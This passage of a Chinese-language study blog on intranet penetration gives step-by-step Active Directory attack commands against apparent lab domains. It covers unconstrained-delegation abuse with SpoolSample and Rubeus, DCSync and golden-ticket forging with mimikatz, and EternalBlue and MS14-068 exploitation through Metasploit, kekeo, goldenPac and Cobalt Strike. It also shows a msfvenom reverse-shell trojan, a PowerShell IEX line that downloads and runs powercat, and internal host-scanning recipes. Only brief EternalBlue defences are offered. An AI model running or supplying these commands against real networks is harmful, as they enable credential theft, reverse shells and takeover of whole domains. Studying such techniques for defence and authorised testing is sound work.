<p>这里先解释一下无约束委派，<mark>无约束委派是一种特权设置，它允许服务器在进行用户身份验证后，将用户的安全上下文传递给其他服务器，而无需再次验证用户的身份。这样一来，其他服务器可以使用用户的身份信息来处理请求，而无需用户再次提供凭据</mark>。服务器在配置了无约束委派后，会允许一个服务器接受来自其他计算机的用户身份验证，并代表这些用户请求资源，而不需要进一步的身份验证。这种配置可以使服务器在进行身份验证时不受限制地将用户的身份信息传递给其他服务器。无约束委派具体做的事情如下：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122200518844.png" alt="image-20231122200518844"></p>
<p>还有一点，林信任和林内信任是不同的概念，注意区分，如下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231123143922810.png" alt="image-20231123143922810"></p>
<p><mark>如果已经获取了域林中某个域控权限，或者配置了无约束委派的任何服务器的权限，那么就可以使用 MS RPRN 的 RpcRemoteFindPrinterChangeNotification(Ex) 方法，使信任林的域控制器向已被控制的服务器发送身份认证请求，从而捕获票据，利用捕获的票据就可以获取信任林内任意用户的哈希值</mark>。</p>
<p>假设这里获取了 <a target="_blank" rel="noopener" href="http://teamssix.com">teamssix.com</a> 域的域控权限，且 <a target="_blank" rel="noopener" href="http://0day.org">0day.org</a> 与 <a target="_blank" rel="noopener" href="http://teamssix.com">teamssix.com</a> 域有林信任关系</p>
<p>首先在 <a target="_blank" rel="noopener" href="http://teamssix.com">teamssix.com</a> 的域控上监听身份认证请求</p>
<p>这里用到Rubeus工具，Rubeus是由国外安全研究院harmj0y用C＃编写的针对Kerberos协议进行攻击的工具，可以发起Kerberos请求，并将请求票据导入内存中，Rebeus提供了大量的用于Kerberos攻击的功能，比如TGT请求/ST请求/AS-REPRoasting攻击/Kerberoasting攻击/委派攻击/黄金票据/白银票据等。下载地址：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
<pre class="line-numbers language-none"><code class="language-none">rubeus.exe monitor &#x2F;interval:5 &#x2F;filteruser:OWA2010SP3$
#interval参数: 用于设置监控的时间间隔
#filteruser参数: 用于指定需要关注的主机，这里的 OWA2010SP3 是 0day.org 域控的主机名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231124104539034.png" alt="image-20231124104539034"></p>
<p>开启监听后，使用 SpoolSample 工具让 <a target="_blank" rel="noopener" href="http://OWA2010SP3.0day.org">OWA2010SP3.0day.org</a> 向 <a target="_blank" rel="noopener" href="http://dc.teamssix.com">dc.teamssix.com</a> 发送身份认证请求</p>
<p>SpoolSample下载地址：</p>
<ul>
<li>原项目：<a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></li>
<li>编译项目：<a target="_blank" rel="noopener" href="https://github.com/jtmpu/PrecompiledBinaries">https://github.com/jtmpu/PrecompiledBinaries</a></li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">SpoolSample.exe OWA2010SP3.0day.org dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231124104616759.png" alt="image-20231124104616759"></p>
<p>获得票据后，使用 rubeus 将票据注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">rubeus.exe ptt &#x2F;ticket:&lt;TGT 票据&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231124104710034.png" alt="image-20231124104710034"></p>
<p>使用 mimikatz 获取目标的 krbtgt 散列值</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:0day.org &#x2F;user:0day\krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231124104758091.png" alt="image-20231124104758091"></p>
<p>接下来，构造黄金票据并将其注入内存，就能够获得 <a target="_blank" rel="noopener" href="http://0day.org">0day.org</a> 域控的权限了</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:0day.org &#x2F;sid:5-1-5-21-1812920812-2335051732-3517558806 &#x2F;rc4:b53a5c8c51648f053b96971e7ae4ee25 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231124104844989.png" alt="image-20231124104844989"></p>
<h1>经典漏洞案例</h1>
<h2 id="永恒之蓝漏洞分析与防范">永恒之蓝漏洞分析与防范</h2>
<p>受永恒之蓝影响的操作系统有：</p>
<ul>
<li>Windows NT</li>
<li>Windows 2000</li>
<li>Windows XP</li>
<li>Windows Server 2003</li>
<li>Windows Vista</li>
<li>Windows 7</li>
<li>Windows 8</li>
<li>Windows Server2008</li>
<li>Windows Server 2008 R2</li>
<li>Windows Server 2012R2</li>
<li>…</li>
</ul>
<p>下面使用msf对永恒之蓝漏洞进行批量检测和利用：</p>
<pre class="line-numbers language-none"><code class="language-none">msfconsole
search ms17-010
use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010
show options<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117231735473.png" alt="image-20231117231735473"></p>
<pre class="line-numbers language-none"><code class="language-none">set rhost 10.1.1.1&#x2F;24     #需要扫描的地址段
set threads 50            #50线程
exploit 			      #开始<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>如下图，检测出来了2台机器有漏洞<br>
如果设置一个很大的地址段，就可以检测整内网的机器有没有漏洞</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117231856160.png" alt="image-20231117231856160"></p>
<p>选择上面扫描的windows 7 : 10.1.1.34</p>
<pre class="line-numbers language-none"><code class="language-none">set rhost 10.1.1.34    							 #攻击地址，有永恒之蓝漏洞的机器
set lhost 10.1.1.30    							 #本地地址，看情况在设置，有时可以跳过
set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp  #反弹的payload
exploit               							 #攻击<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117232034940.png" alt="image-20231117232034940"></p>
<pre class="line-numbers language-none"><code class="language-none">getuid      #获取权限
hashdump    #抓取当前用户散列值
shell       #获得shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117232119533.png" alt="image-20231117232119533"></p>
<p>防御“永恒之蓝”漏洞对Windows操作系统的攻击，方法如下：</p>
<ul>
<li>禁用SMB协议(该方法适用于Windows Vista及更高版本的操作系统)。</li>
<li>打开Windows Update,或者手动安装KB2919355。</li>
<li>使用防火墙阻止445端口的连接，或者使用进/出站规则阻止445端口的连接。</li>
<li>不要随意打开陌生的文件。</li>
<li>安装杀毒软件，及时进行更新病毒库。</li>
</ul>
<h2 id="Kerberos-域用户提权漏洞分析-CVE-2014-6324">Kerberos 域用户提权漏洞分析(CVE-2014-6324)</h2>
<p>在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-6324，该漏洞影响了 Windows Server 2012 R2 以下的服务器，该漏洞允许 RT 将任意用户权限提升至域管级别。</p>
<p>属于远古时代的漏洞，现实中已经很少会碰到了，这里主要熟悉下工具的用法。</p>
<p>14-068 产生的原因主要在于<mark>用户可以利用伪造的票据向认证服务器发起请求，如果用户伪造域管的票据，服务端就会把拥有域管权限的服务票据返回回来</mark>。</p>
<h3 id="PyKEK">PyKEK</h3>
<p>PyKEK 是一个利用 Kerberos 协议进行渗透的工具包，下载地址：<a target="_blank" rel="noopener" href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a></p>
<p><mark>使用 PyKEK 可以生成一个高权限的服务票据</mark>，之后通过 mimikatz 将服务票据导入到内存中。</p>
<p>MS 14-068 的补丁为：KB3011780，通过 wmic 查看补丁情况</p>
<pre class="line-numbers language-none"><code class="language-none">wmic qfe get hotfixid | findstr KB3011780<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查看当前用户 SID</p>
<pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者使用 wmic</p>
<pre class="line-numbers language-none"><code class="language-none">#获取域内所有用户的SID
wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>生成高权限票据，-d 指定域控地址</p>
<pre class="line-numbers language-none"><code class="language-none">#python2 ms14-068.py -u 域成员名@域名 -s 域成员SID -d 域控地址 -p 域成员密码
python2 ms14-068.py -u jack@0day.org -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142 -p Aa123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>打开 mimikatz 清除当前内存中的票据信息</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>将高权限票据注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::ptc &quot;TGT_jack@0day.org.ccache&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用 net use 连接域控后，使用 psexec 获取 Shell</p>
<blockquote>
<p>这里 net ues 使用 IP 可能会失败，因此在此使用机器名进行连接</p>
</blockquote>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120204525857.png" alt="image-20231120204525857"></p>
<h3 id="GoldenPac">GoldenPac</h3>
<p><a target="_blank" rel="noopener" href="http://goldenPac.py">goldenPac.py</a> 是一个用于对 Kerberos 协议进行测试的工具，它集成在 impacket 工具包里。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120204712225.png" alt="image-20231120204712225"></p>
<p>Kali 在使用之前需要先安装 Kerberos 客户端</p>
<pre class="line-numbers language-none"><code class="language-none">apt-get install krb5-user -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>利用 <a target="_blank" rel="noopener" href="http://goldenPac.py">goldenPac.py</a> 获取 Shell</p>
<pre class="line-numbers language-none"><code class="language-none">#python3 goldenPac.py 域名&#x2F;域成员用户:密码@域控地址
python3 goldenPac.py 0day.org&#x2F;jack:Aa123456@OWA2010SP3.0day.org<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<blockquote>
<p>这里使用 IP 进行连接会连接不成功，只能使用主机名，因此可以在 hosts 文件中添加主机名对应的 IP(做一个映射)</p>
</blockquote>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120204815993.png" alt="image-20231120204815993"></p>
<p><a target="_blank" rel="noopener" href="http://goldenPac.py">goldenPac.py</a> 是通过 PsExec 获得 Shell 的，因此<mark>会产生大量的日志，而且现在这种连接方式也已经被各大杀软所拦截</mark>。</p>
<h3 id="kekeo">kekeo</h3>
<p>kekeo 也是一个工具集，其中包含了 ms14-068 的利用模块，kekeo 下载地址：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
<p>使用之前需要先清除票据</p>
<pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后直接使用 kekeo 生成高权限票据</p>
<pre class="line-numbers language-none"><code class="language-none">kekeo.exe &quot;exploit::ms14068 &#x2F;domain:0day.org &#x2F;user:jack &#x2F;password:Aa123456 &#x2F;ptt&quot; &quot;exit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>之后就可以直接 dir 域控或者 PsExec 连接到域控了</p>
<h3 id="MSF">MSF</h3>
<p>MSF 中也有 MS 14-086 的提权 EXP，不过需要结合 mimikatz 进行利用</p>
<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksum
set domain 0day.org
set password Aa123456
set user jack
set user_sid  S-1-5-21-1812960810-2335050734-3517558805-1133
set rhosts OWA2010SP3.0day.org
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>设置好域名、域控 IP、密码、用户、SID 后运行，将会获取一个 bin 文件</p>
<p>由于 MSF 里不支持 bin 文件的导入，因此需要 mimikatz 对其进行格式转换</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::clist &quot;20210923061821_default_192.168.3.142_windows.kerberos_484249.bin&quot; &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>之后，生成一个木马</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.74 lport&#x3D;4444 -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>将木马复制到目标主机上，并使其上线到 MSF</p>
<p>获得会话后，将刚才 mimikatz 转换后的 kirbi 文件导入到会话中</p>
<pre class="line-numbers language-none"><code class="language-none">load kiwi
kerberos_ticket_use &#x2F;tmp&#x2F;0-00000000-jack@krbtgt-0DAY.ORG.kirbi
background<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>之后使用 current_user_psexec 模块</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;current_user_psexec
set session 2
set rhosts OWA2010SP3.0day.org
set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
set lhost 172.16.214.74
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后就会返回高权限的会话</p>
<h3 id="Cobalt-Strike">Cobalt Strike</h3>
<p>先利用前面的 <a target="_blank" rel="noopener" href="http://ms14-068.py">ms14-068.py</a> 生成一个 ccache 文件，之后使用 KrbCredExport 将 ccache 文件转为 kirbi 格式</p>
<p>KrbCredExport 下载地址：<a target="_blank" rel="noopener" href="https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a></p>
<pre class="line-numbers language-none"><code class="language-none">python2 KrbCredExport.py TGT_jack@0day.org.ccache user.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>接着使用 CS 的 kerberos_ticket_use 加载 ticket，之后就能访问到域控了</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120205804879.png" alt="image-20231120205804879"></p>
<p>此时想让域控上线自然也是没问题的了，可以先添加一个域控地址的 target，然后选择 PsExec ，勾选上 use session’s current access token 通过 jack 的会话上线即可。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120210313377.png" alt="image-20231120210313377"></p>
<h1>内网探测技术</h1>
<p>这里先阐述一下内网主机探测的不同场景：</p>
<ul>
<li>
<p>获取到了webshell，此时一般用系统命令或上传脚本工具进行探测</p>
</li>
<li>
<p>主机已在目标内网（已经拿下一台内网主机），比如已经通过正向或者反向代理搭建隧道的场景。此时可以考虑proxychains+Nmap扫描</p>
</li>
<li>
<p>拿到了一个反弹shell，则可以考虑MSF。要根据不同的场景考虑支持存活探测的协议，包括了ARP、ICMP、SMB、 UDP、SNMP协议等；支持端口扫描的方式，包括TCP扫描、UDP扫描、ICMP扫描等</p>
</li>
</ul>
<p>下面在列举内网不同协议的主机探测：</p>
<ul>
<li>ICMP协议</li>
<li>TCP协议</li>
<li>UDP协议</li>
<li>Netbios协议</li>
<li>ARP协议</li>
<li>SMB协议</li>
<li>SNMP协议</li>
</ul>
<h2 id="ping（基于ICMP协议探测）">ping（基于ICMP协议探测）</h2>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240330205544383.png" alt="image-20240330205544383"></p>
<blockquote>
<p>服务器开启防火墙或者禁ping的时候不可用，否则影响探测结果。这里再提一下nmap的-Pn参数，即设置nmap为PN No ping扫描模式。如果远程主机有防火墙，可以使用-PN命令来确保nmap不ping远程主机，因为有时候防火墙会阻断ping请求。PN命令告诉nmap不用ping远程主机。使用-PN参数可以绕过ping命令，但是不影响主机的系统的发现。</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none"># Windows cmd 下
for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.244.%I | findstr &quot;TTL&#x3D;&quot;
或
for &#x2F;l %i in (1,1,255) do @ping 192.168.244.%i -w 1 -n 1 | find &#x2F;i &quot;ttl&#x3D;&quot;
# linux下
for k in $( seq 1 255);do ping -c 1 10.0.1.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done
# 如果终端不方便显示结果，可以使用重定向符先写入到文件中再查看<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用ping效率低、时间久</p>
<h2 id="nmap（推荐）">nmap（推荐）</h2>
<pre class="line-numbers language-none"><code class="language-none"># 基于TCP协议探测（必须使用-sT、-Pn参数）
proxychains nmap -sT -Pn --min-rate 10000 192.168.244.128&#x2F;24
proxychains nmap -sT -Pn --top-port 20 192.168.244.128&#x2F;24
proxychains nmap -sT -Pn -p3306 192.168.244.128&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>亲测，nmap使用nps的socks5代理扫描端口时，会显示所有端口都打开，准确率极低，所以尽量不要使用nmap配合nps的socks5代理，可以选择其他的内网穿透工具，比如iox</p>
</blockquote>
<h2 id="msf">msf</h2>
<pre class="line-numbers language-none"><code class="language-none">proxychains msfconsole
# 基于TCP协议探测
use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp
set rhosts 192.168.244.128
run

# 基于其他协议探测
use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_version 
use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;anonymous
use auxiliary&#x2F;scanner&#x2F;http&#x2F;http_version
use auxiliary&#x2F;scanner&#x2F;http&#x2F;title
use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version
use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version
use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version
use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_version
use auxiliary&#x2F;scanner&#x2F;dns&#x2F;dns_amp
use auxiliary&#x2F;scanner&#x2F;db2&#x2F;db2_version
use auxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner
use auxiliary&#x2F;scanner&#x2F;smtp&#x2F;smtp_version
use auxiliary&#x2F;scanner&#x2F;pop3&#x2F;pop3_version
use auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>亲测，msf使用nps的socks5代理扫描端口时，会显示所有端口都打开，准确率极低，所以尽量不要使用msf配合nps的socks5代理，可以选择其他的内网穿透工具，比如iox</p>
</blockquote>
<h2 id="fscan（推荐）">fscan（推荐）</h2>
<pre class="line-numbers language-none"><code class="language-none"># 使用socks代理进行扫描，如果没有socks代理，则需将fscan上传至目标内网跳板机
# fscan自带socks代理参数-socks5，注意不要使用proxychains，使用proxychains无法配合fscan，会扫不出东西
# fscan自带的socks代理参数-socks5不能配合nps的socks5代理，会显示所有主机存活，准确率极低
.&#x2F;fscan -h 192.168.244.1&#x2F;24 -socks5 socks5:&#x2F;&#x2F;122.152.227.248:1080
.&#x2F;fscan -h 192.168.244.1&#x2F;24 -np -nopoc -no -socks5 socks5:&#x2F;&#x2F;122.152.227.248:1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Railgun（推荐）">Railgun（推荐）</h2>
<p>Windows下的一款可视化工具，可以配合全局代理工具（如Proxifier、SocksCap64）进行内网扫描，速度极快</p>
<h2 id="netspy">netspy</h2>
<p>一款快速探测内网可达网段工具（能够知道当前主机能通哪些内网段）</p>
<p>需要上传至内网目标机器</p>
<h2 id="Ladon">Ladon</h2>
<p>一款大型内网渗透工具</p>
<p>github地址：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/k8gege/Aggressor">https://github.com/k8gege/Aggressor</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a></li>
</ul>
<p>需要上传至内网目标机器</p>
<h1>内网渗透常用指令与特性</h1>
<h2 id="常用指令">常用指令</h2>
<p>将远程脚本下载到本地并执行</p>
<pre class="line-numbers language-none"><code class="language-none">IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231105223108142.png" alt="image-20231105223108142"></p>
<p>列出Windows上当前正在运行的进程以及与每个进程相关联的服务：</p>
<pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;svc
# 常用于查看win上的杀软<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>列出所有本地用户账户：</p>
<pre class="line-numbers language-none"><code class="language-none">net user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="常用特性">常用特性</h2>
<ol>
<li>
<p>PowerShell脚本执行的两种方式</p>
<pre class="line-numbers language-none"><code class="language-none">#使用脚本全名
.\test.ps1
#使用脚本文件主名
.\test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114215525039.png" alt="image-20231114215525039"></p>
</li>
<li></li>
</ol>
<h1>鸣谢</h1>
<ul>
<li>
<p>《内网安全攻防：渗透测试实战指南》</p>
</li>
<li>
<p>WgpSec狼组安全团队</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/vincent95/1380680">组详解：全局组、域本地组、通用组的区别与联系 _51CTO博客_全局组 通用组 域本地组</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://teamssix.com/211027-163641">【建议收藏】内网学习笔记合集 | TeamsSix</a><a target="_blank" rel="noopener" href="https://teamssix.com/210203-192358.html">https://teamssix.com/210203-192358.html</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://fasionchan.com/network/dns/record-types/">DNS记录类型 | 小菜学网络 (fasionchan.com)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://hasaki-h2.github.io/401ba385.html">内网学习笔记四 | 权限提升分析及防御 | RainMaker (hasaki-h2.github.io)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0xl4k1d/p/15725280.html">Windows提权（二）——组策略与UAC - 0xL4k1d - 博客园 (cnblogs.com)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mrhonest/p/12903940.html">MSF进程迁移 - mrhonest - 博客园 (cnblogs.com)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/313577570">域之ntds.dit - 知乎 (zhihu.com)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1752212">使用卷影拷贝服务提取 ntds.dit 的多种姿势-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E8%8E%B7%E5%BE%97%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTDS.dit%E6%96%87%E4%BB%B6">域渗透——获得域控服务器的NTDS.dit文件 (3gstudent.github.io)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64973687/article/details/128247047">域渗透之哈希传递攻击及其原理-CSDN博客</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44286136/article/details/127616219">第5章 域内横向移动分析及防御-CSDN博客</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Exchange 漏洞利用 - Geekby’s Blog</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://blog.riskivy.com/exchange-server-in-pentest/">深入Exchange Server在网络渗透下的利用方法 - 斗象能力中心 (riskivy.com)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1379568?areaSource=106002.6">网藤能力中心 | 深入Exchange Server在网络渗透下的利用方法-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1760129">利用 dcsync 获取域内所有用户哈希值-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://m.freebuf.com/articles/network/365750.html">内网渗透之滥用DCSync - FreeBuf网络安全行业门户</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://buaq.net/go-197376.html">攻击域控丝滑小连招（2） (buaq.net)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2228421">域控安全之ntds.dit导出-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/354870.html">域控安全之ntds.dit导出 - FreeBuf网络安全行业门户</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">浅析黄金票据与白银票据 - Shu1L’s blog</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/1-Ry/p/15418602.html">黄金票据、白银票据 - 1_Ry - 博客园 (cnblogs.com)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/8127868.html">Kerberos的黄金票据详解 - 渗透测试中心 - 博客园 (cnblogs.com)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2130133">一文了解黄金票据和白银票据-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/">白银票据与黄金票据探究 | sh1yan’blog</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://wuhash.gitee.io/2020-04-24.html">黄金票据与白银票据 | 在学安全的路上 (gitee.io)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2011">https://adsecurity.org/?p=2011</a></p>
</li>
<li>
